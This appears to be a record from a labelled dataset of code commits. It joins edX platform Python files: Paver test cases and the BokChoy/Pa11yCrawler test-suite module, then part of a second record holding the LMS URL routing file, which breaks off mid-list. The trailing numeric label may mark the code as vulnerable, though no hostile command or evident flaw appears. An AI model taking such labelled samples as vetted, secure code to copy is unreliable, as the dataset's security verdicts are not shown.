            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, """")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'True')
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """"""
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """"""
        expected_verbosity_string = (
            ""--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """"""
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """"""
        process_count = 2
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """"""
        With the above test, validate that num_processes can be set to various values
        """"""
        process_count = 3
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """"""
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """"""
        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """"""
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """"""

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """"""
        Returns the expected command to run pa11ycrawler.
        """"""
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter=""1.0-json"" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])
/n/n/n/pavelib/utils/test/suites/bokchoy_suite.py/n/n""""""
Class used for defining and running Bok Choy acceptance test suite
""""""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """"""
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """"""
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / ""xunit.xml""
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', ""Checking for mongo, memchache, and mysql..."")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', ""Confirming servers have started..."")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', ""Cleaning up databases..."")
            print msg
            sh(""./manage.py lms --settings bok_choy flush --traceback --noinput"")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """"""
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """"""
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct ""multiprocess"" nosetest substring
            substring = [
                ""--with-xunitmp --xunitmp-file={}"".format(self.xunit_report),
                ""--processes={}"".format(self.num_processes),
                ""--no-color --process-timeout=1200""
            ]

        else:
            substring = [
                ""--with-xunit"",
                ""--xunit-file={}"".format(self.xunit_report),
                ""--verbosity={}"".format(self.verbosity),
            ]

        return "" "".join(substring)

    def prepare_bokchoy_run(self):
        """"""
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """"""
        sh(""{}/scripts/reset-test-db.sh"".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', ""Confirming servers are running..."")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """"""
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """"""
        msg = colorize('green', ""Importing courses from {}..."".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                ""DEFAULT_STORE={default_store}""
                "" ./manage.py cms --settings=bok_choy import {import_dir}"".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """"""
        Loads data into database from db_fixtures
        """"""
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            ""DEFAULT_STORE={default_store}""
            "" ./manage.py lms --settings bok_choy loaddata --traceback""
            "" common/test/db_fixtures/*.json"".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """"""
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """"""
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print ""Stopping bok-choy servers.\n""
                break

    @property
    def cmd(self):
        """"""
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """"""
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return """"

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            ""DEFAULT_STORE={}"".format(self.default_store),
            ""SCREENSHOT_DIR='{}'"".format(self.log_dir),
            ""BOK_CHOY_HAR_DIR='{}'"".format(self.har_dir),
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'"".format(self.a11y_file),
            ""SELENIUM_DRIVER_LOG_DIR='{}'"".format(self.log_dir),
            ""VERIFY_XSS='{}'"".format(self.verify_xss),
            ""nosetests"",
            test_spec,
            ""{}"".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append(""--pdb"")
        if self.save_screenshots:
            cmd.append(""--with-save-baseline"")
        cmd.append(self.extra_args)

        cmd = ("" "").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """"""
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """"""

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = ""https://github.com/edx/demo-test-course/archive/master.tar.gz""

        self.start_urls = []
        auto_auth_params = {
            ""redirect"": 'true',
            ""staff"": 'true',
            ""course_id"": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8031/auto_auth?{}\"""".format(cms_params))

        sequence_url = ""/api/courses/v1/blocks/?{}"".format(
            urlencode({
                ""course_id"": self.course_key,
                ""depth"": ""all"",
                ""all_blocks"": ""true"",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8003/auto_auth?{}\"""".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """"""
        Fetches the test course.
        """"""
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', ""Fetching the test course from github..."")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', ""Uncompressing the test course..."")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """"""
        Runs pa11ycrawler json-to-html
        """"""
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """"""
        Runs pa11ycrawler as staff user against the test course.
        """"""
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter=""{reporter}"" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter=""1.0-json"",
            dont_go_here=""logout"",
            depth=""6"",
        )
        return cmd_str
/n/n/n",1
38,4e4c209ae3deb4c78bcec89c181516af8604b450,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
